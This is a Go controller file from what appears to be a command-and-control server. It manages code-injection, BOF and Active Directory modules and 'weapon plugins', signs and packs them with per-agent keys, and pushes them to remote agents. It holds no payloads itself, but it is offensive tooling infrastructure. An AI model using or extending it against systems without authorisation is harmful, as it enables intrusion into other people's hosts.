package controllers

import (
	"errors"
	"fmt"
	"net/http"
	"os"
	"path/filepath"
	"strings"
	"time"

	"github.com/gin-gonic/gin"
	"github.com/google/uuid"

	"cupcake-server/pkg/globals"
	"cupcake-server/internal/service"
)

// HandleListModules GET /api/modules?uuid= optional agent for loaded_on_agent flags
func HandleListModules(c *gin.Context) {
	ms := services.GetModuleService()
	agentUUID := strings.TrimSpace(c.Query("uuid"))
	osName := ""
	if agentUUID != "" {
		if val, ok := globals.Clients.Load(agentUUID); ok {
			if cl, ok2 := val.(*globals.Client); ok2 {
				osName = cl.OS
			}
		}
	}
	catalog := ms.ListCatalog(agentUUID, osName)
	c.JSON(http.StatusOK, gin.H{
		"modules": catalog,
		// backward-compatible id list
		"ids": ms.List(),
		// 模块能力 vs 插件能力 summary for UI
		"capability_kind": "module",
		"product_ids":     []string{"bof", "inject", "ad"},
	})
}

// HandleCapabilities GET /api/capabilities?uuid= optional
// Returns unified module/plugin capability matrix for UI gating.
func HandleCapabilities(c *gin.Context) {
	ms := services.GetModuleService()
	agentUUID := strings.TrimSpace(c.Query("uuid"))
	osName := ""
	if agentUUID != "" {
		if val, ok := globals.Clients.Load(agentUUID); ok {
			if cl, ok2 := val.(*globals.Client); ok2 {
				osName = cl.OS
			}
		}
	}

	// Warehouse catalog (no OS filter) for registry status; agent-scoped for loaded flags.
	warehouse := ms.ListCatalog("", "")
	agentMods := []services.ModuleCatalogEntry{}
	if agentUUID != "" {
		agentMods = ms.ListCatalog(agentUUID, osName)
	}

	type modCap struct {
		ID           string   `json:"id"`
		Name         string   `json:"name"`
		Capabilities []string `json:"capabilities"`
		Registered   bool     `json:"registered"`
		Signed       bool     `json:"signed"`
		Version      string   `json:"version,omitempty"`
		Loaded       bool     `json:"loaded_on_agent,omitempty"`
		SupportedOS  []string `json:"supported_os,omitempty"`
	}
	moduleCaps := make([]modCap, 0, 3)
	for _, id := range []string{"bof", "inject", "ad"} {
		name, _, _, _ := services.ModuleDescribeEx(id)
		entry := modCap{
			ID:           id,
			Name:         name,
			Capabilities: services.ModuleCapabilities(id),
			SupportedOS:  []string{"windows"},
		}
		for _, e := range warehouse {
			if e.ID == id {
				entry.Registered = true
				entry.Signed = e.Signed
				entry.Version = e.Version
				if len(e.SupportedOS) > 0 {
					entry.SupportedOS = e.SupportedOS
				}
				break
			}
		}
		if agentUUID != "" {
			entry.Loaded = ms.AgentHasModule(agentUUID, id)
			for _, e := range agentMods {
				if e.ID == id && e.LoadedOnAgent {
					entry.Loaded = true
				}
			}
		}
		moduleCaps = append(moduleCaps, entry)
	}

	plugins, _ := services.LoadPluginManifest()
	type plugCap struct {
		ID             string   `json:"id"`
		Name           string   `json:"name"`
		Type           string   `json:"type"`
		RequiredModule string   `json:"required_module,omitempty"`
		Capabilities   []string `json:"capabilities"`
		RequiredOS     string   `json:"required_os,omitempty"`
	}
	pluginCaps := make([]plugCap, 0, len(plugins))
	for _, p := range plugins {
		cp := p
		services.EnrichPluginCapabilities(&cp)
		pluginCaps = append(pluginCaps, plugCap{
			ID:             cp.ID,
			Name:           cp.Name,
			Type:           cp.Type,
			RequiredModule: cp.RequiredModule,
			Capabilities:   cp.Capabilities,
			RequiredOS:     cp.RequiredOS,
		})
	}

	unlocked := []string{}
	if agentUUID != "" {
		for _, m := range moduleCaps {
			if m.Loaded {
				unlocked = append(unlocked, m.Capabilities...)
			}
		}
	}

	c.JSON(http.StatusOK, gin.H{
		"module_capabilities": moduleCaps, // 模块能力 (L2: bof/inject/ad)
		"plugin_capabilities": pluginCaps, // 插件能力 (weapon plugins)
		"agent_uuid":          agentUUID,
		"agent_os":            osName,
		"unlocked":            unlocked,
		"labels": gin.H{
			"module": "模块能力",
			"plugin": "插件能力",
		},
	})
}

// HandleUploadModule POST /api/modules/upload
// form: id=bof|inject|ad, file=<exe/dll>
func HandleUploadModule(c *gin.Context) {
	id := c.PostForm("id")
	if id == "" {
		id = c.Query("id")
	}
	if id == "" {
		c.JSON(http.StatusBadRequest, gin.H{"error": "missing module id (bof | inject | ad)"})
		return
	}
	if !services.IsProductModule(id) {
		c.JSON(http.StatusForbidden, gin.H{
			"error": "only product modules: bof, inject, ad",
			"code":  "forbidden",
		})
		return
	}
	file, err := c.FormFile("file")
	if err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": "missing file", "code": "missing_file"})
		return
	}
	dir := services.GetModuleService().Dir()
	_ = os.MkdirAll(dir, 0o755)
	tmp := filepath.Join(dir, fmt.Sprintf("_upload_%s_%s", uuid.NewString(), filepath.Base(file.Filename)))
	if err := c.SaveUploadedFile(file, tmp); err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": err.Error()})
		return
	}
	defer os.Remove(tmp)
	ms := services.GetModuleService()
	raw, err := os.ReadFile(tmp)
	if err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": err.Error()})
		return
	}
	version := strings.TrimSpace(c.PostForm("version"))
	signer := strings.TrimSpace(c.PostForm("signer"))
	trust := services.ModulePackageMeta{
		ID:      id,
		Version: version,
		Signer:  signer,
	}
	// Always auto-sign + persist {id}.trust.json next to the binary.
	signed, err := ms.RegisterRawWithTrust(id, raw, trust)
	if err != nil {
		if errors.Is(err, services.ErrModuleForbidden) {
			c.JSON(http.StatusForbidden, gin.H{"error": err.Error()})
			return
		}
		c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
		return
	}
	name, desc, kind := services.ModuleDescribe(id)
	c.JSON(http.StatusOK, gin.H{
		"msg":          "module registered and signed",
		"id":           id,
		"name":         name,
		"description":  desc,
		"kind":         kind,
		"sha256":       signed.SHA256,
		"version":      signed.Version,
		"signer":       signed.Signer,
		"signature":    signed.Signature,
		"signed":       signed.Signature != "",
		"trust_file":   id + ".trust.json",
		"capabilities": services.ModuleCapabilities(id),
	})
}

// HandleDeleteModule DELETE /api/modules/:id
// 403 non-product, 404 missing, 200 deleted. No policy-lock (any admin may delete).
func HandleDeleteModule(c *gin.Context) {
	id := c.Param("id")
	if id == "" {
		c.JSON(http.StatusBadRequest, gin.H{"error": "missing module id"})
		return
	}
	ms := services.GetModuleService()
	if err := ms.Delete(id); err != nil {
		if errors.Is(err, services.ErrModuleForbidden) {
			c.JSON(http.StatusForbidden, gin.H{"error": err.Error(), "code": "forbidden"})
			return
		}
		if errors.Is(err, services.ErrModuleNotFound) {
			c.JSON(http.StatusNotFound, gin.H{"error": err.Error(), "code": "not_found"})
			return
		}
		c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
		return
	}
	c.JSON(http.StatusOK, gin.H{"msg": "module deleted", "id": id})
}

// HandlePushModule POST /api/modules/push
// json: {"uuid":"...","id":"bof","force":true}
// Waits for agent ack (up to 25s) so UI can show real success / loaded state.
func HandlePushModule(c *gin.Context) {
	var req struct {
		UUID  string `json:"uuid"`
		ID    string `json:"id"`
		Force bool   `json:"force"`
	}
	if err := c.ShouldBindJSON(&req); err != nil || req.UUID == "" || req.ID == "" {
		c.JSON(http.StatusBadRequest, gin.H{"error": "uuid and id required"})
		return
	}
	if !services.IsProductModule(req.ID) {
		c.JSON(http.StatusForbidden, gin.H{"error": "only product modules: bof, inject, ad", "code": "forbidden"})
		return
	}
	// Platform gate: refuse to push windows-only modules (bof, inject, ad) to linux agents.
	if val, ok := globals.Clients.Load(req.UUID); ok {
		if cl, ok2 := val.(*globals.Client); ok2 {
			if !services.IsModuleSupportedOnOS(req.ID, cl.OS) {
				c.JSON(http.StatusForbidden, gin.H{
					"error":   fmt.Sprintf("module %s is not supported on agent OS %q", req.ID, cl.OS),
					"code":    "platform_mismatch",
					"module":  req.ID,
					"agent_os": cl.OS,
				})
				return
			}
		}
	}
	ms := services.GetModuleService()
	if !req.Force && ms.AgentHasModule(req.UUID, req.ID) {
		name, _, _ := services.ModuleDescribe(req.ID)
		c.JSON(http.StatusOK, gin.H{
			"msg":          "module already staged/loaded on agent (pass force=true to re-push)",
			"id":           req.ID,
			"name":         name,
			"loaded":       true,
			"alive":        true,
			"capabilities": services.ModuleCapabilities(req.ID),
		})
		return
	}
	if req.Force {
		ms.ClearAgentModule(req.UUID, req.ID)
	}

	out, err := services.SendModuleStageWait(req.UUID, req.ID, 25*time.Second)
	name, desc, kind := services.ModuleDescribe(req.ID)
	if err != nil {
		// Timeout: do not claim loaded (SendModuleStageWait no longer marks optimistic)
		if strings.Contains(err.Error(), "timeout") {
			c.JSON(http.StatusGatewayTimeout, gin.H{
				"error":       err.Error(),
				"msg":         "模块已下发但确认超时，请稍后重试或 force 重推",
				"id":          req.ID,
				"name":        name,
				"description": desc,
				"kind":        kind,
				"loaded":      false,
				"alive":       false,
				"detail":      out,
			})
			return
		}
		c.JSON(http.StatusBadRequest, gin.H{"error": err.Error(), "id": req.ID, "name": name})
		return
	}
	c.JSON(http.StatusOK, gin.H{
		"msg":          "模块推送成功，已在目标主机就绪",
		"id":           req.ID,
		"name":         name,
		"description":  desc,
		"kind":         kind,
		"loaded":       true,
		"alive":        true,
		"detail":       out,
		"capabilities": services.ModuleCapabilities(req.ID),
	})
}

// HandlePackModule GET /api/modules/pack/:id?uuid=... or ?listener_id=...
// Without uuid/listener_id packs with default/dev key (debug only).
func HandlePackModule(c *gin.Context) {
	id := c.Param("id")
	if !services.IsProductModule(id) {
		c.JSON(http.StatusForbidden, gin.H{"error": "only product modules: bof, inject, ad", "code": "forbidden"})
		return
	}
	// Optional platform hint: if uuid given, refuse pack of windows-only module for linux agent.
	if uuid := strings.TrimSpace(c.Query("uuid")); uuid != "" {
		if val, ok := globals.Clients.Load(uuid); ok {
			if cl, ok2 := val.(*globals.Client); ok2 {
				if !services.IsModuleSupportedOnOS(id, cl.OS) {
					c.JSON(http.StatusForbidden, gin.H{
						"error":   fmt.Sprintf("module %s cannot be packed for agent OS %q", id, cl.OS),
						"code":    "platform_mismatch",
					})
					return
				}
			}
		}
	}
	ms := services.GetModuleService()
	name, desc, kind := services.ModuleDescribe(id)

	// Prefer agent/listener-aligned HMAC key when identity is provided
	var b64 string
	var err error
	if uuid := strings.TrimSpace(c.Query("uuid")); uuid != "" {
		if val, ok := globals.Clients.Load(uuid); ok {
			client := val.(*globals.Client)
			key := services.ModuleHMACKeyForAgent(client)
			b64, err = ms.PackBase64WithKey(id, key)
		} else {
			c.JSON(http.StatusNotFound, gin.H{"error": "agent offline; cannot pack with session key"})
			return
		}
	} else if lid := strings.TrimSpace(c.Query("listener_id")); lid != "" {
		if val, ok := globals.Listeners.Load(lid); ok {
			ln := val.(*globals.Listener)
			key := services.ModuleHMACKeyForListener(ln.EncryptKey, ln.EncryptionSalt)
			b64, err = ms.PackBase64WithKey(id, key)
		} else {
			c.JSON(http.StatusNotFound, gin.H{"error": "listener not found"})
			return
		}
	} else {
		b64, err = ms.PackBase64(id)
	}
	if err != nil {
		if errors.Is(err, services.ErrModuleForbidden) {
			c.JSON(http.StatusForbidden, gin.H{"error": err.Error()})
			return
		}
		c.JSON(http.StatusNotFound, gin.H{"error": err.Error()})
		return
	}
	c.JSON(http.StatusOK, gin.H{
		"id":          id,
		"name":        name,
		"description": desc,
		"kind":        kind,
		"data":        b64,
	})
}

// HandleQueryAgentModules POST /api/modules/query
func HandleQueryAgentModules(c *gin.Context) {
	var req struct {
		UUID string `json:"uuid"`
	}
	if err := c.ShouldBindJSON(&req); err != nil || req.UUID == "" {
		c.JSON(http.StatusBadRequest, gin.H{"error": "uuid required"})
		return
	}
	out, err := services.SendModuleList(req.UUID)
	if err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
		return
	}
	ms := services.GetModuleService()
	os := ""
	if val, ok := globals.Clients.Load(req.UUID); ok {
		if cl, ok2 := val.(*globals.Client); ok2 {
			os = cl.OS
		}
	}
	c.JSON(http.StatusOK, gin.H{
		"result":  out,
		"modules": ms.ListCatalog(req.UUID, os),
	})
}

